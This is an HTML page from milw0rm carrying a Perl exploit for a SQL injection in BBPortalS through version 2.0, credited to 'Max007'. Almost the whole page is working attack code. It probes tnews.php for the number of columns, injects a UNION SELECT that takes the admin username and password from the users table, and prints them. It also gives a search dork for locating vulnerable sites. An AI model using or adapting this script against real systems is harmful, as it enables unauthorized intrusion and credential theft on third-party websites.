<html><head><title>BBPortalS <= 2.0 Remote Blind SQL Injection Exploit </title></head><pre>#BBPortalS BBsProcesS Remote Blind SQL Injection Exploit 
#Bug Found And Write By Max007
#Exploit Tested On V.1.5.10 And V.1.6.2 And 1.5.11
#info:For The Version BBPortalS 2.0 name of field is user and password but you have to find name of table
#!/usr/bin/perl
use LWP::UserAgent;
$err=1;
$www = new LWP::UserAgent;
sub utilisation()
{
print &quot;\n\tVulnerability Found By Max007 ;)&quot;;
print &quot;\n\tBlind SQL Injection In Script BBPortalS / BBsProcesS\n\tDork:\&quot;inurl : tnews.php?op\&quot;&quot;;
print &quot;\n\tSyntax Exmple: &quot;;
print &quot;Exploit.pl http://www.site-vuln.com\n&quot;;
exit(0);
}

sub err()
{
print &quot;\n this script is not vulnerable !\n&quot;;
exit();
}

sub table()
{
print &quot;\n\n \tThis Site Is Vulerable\n \tNumber of Fields : $err\n\tBut You have To Find Name Of Table !\n\tI Don't Have Time To Do This For you hhh ;)\n&quot;;
exit();
}

if(!$ARGV[0]){utilisation();}
$host=$ARGV[0];


sub max007()
{
$champ=&quot;1,&quot; x $err;
chop($champ);
$inject=&quot;tnews.php?op=tnews&amp;id=-9/**/group/**/by/**/$err/*&quot;;
$sql = &quot;$host/&quot;.$inject;
print &quot;\n                 research number of fields .... \n&quot;;
$res = $www -&gt; get($sql);
if(!($res -&gt; content =~ /Warning/)){
print &quot;               The Current number of fields is : $err\n&quot;;
$err++;
max007();
}
else{
if($err==1){ err();}
}
}
if($err==1){ max007();}
$err-=1;
#system(&quot;cls&quot;);
print &quot;\nThe number of fields is: $err&quot;;

$nbr_champ=$err;
$champ=&quot;concat(char(117,115,101,114,110,97,109,101,58),login,char(32,32,61,61,61,61,61,32,32,32,112,97,115,115,119,111,114,100,58),pass,char(42,42,42,42,42,42,42,42,42,42,61,61,61,61,61,61,61,61,61,61)),&quot; x $nbr_champ;
chop($champ);

$inject=&quot;tnews.php?op=tnews&amp;id=-9/**/union/**/select/**/&quot;.$champ.&quot;/**/from/**/users/**/where/**/pid=1/*&quot;;
$sql = &quot;$host/&quot;.$inject;
$res = $www -&gt; get($sql) or err();
$i=0;$j=0;
$i=index($res-&gt;content,'username:');
$j=index($res-&gt;content,'**********==========');
$ch=substr($res-&gt;content,$i,$j-$i);

if($res-&gt;content =~ /username/)
{
print &quot;\n\n              Attack successful\n\n&quot;;
print &quot;Admin User Name And Password Has Been Found ;)\n\n\t&quot;;
print &quot;$ch \n\n&quot;;
}

else {table();}

#Je Suis Triste Vraiment Triste Et Je ne Sais Pas Pourquoi,PourTant je ne dois pas l'Ãªtre,

# milw0rm.com [2007-10-21]</pre></html>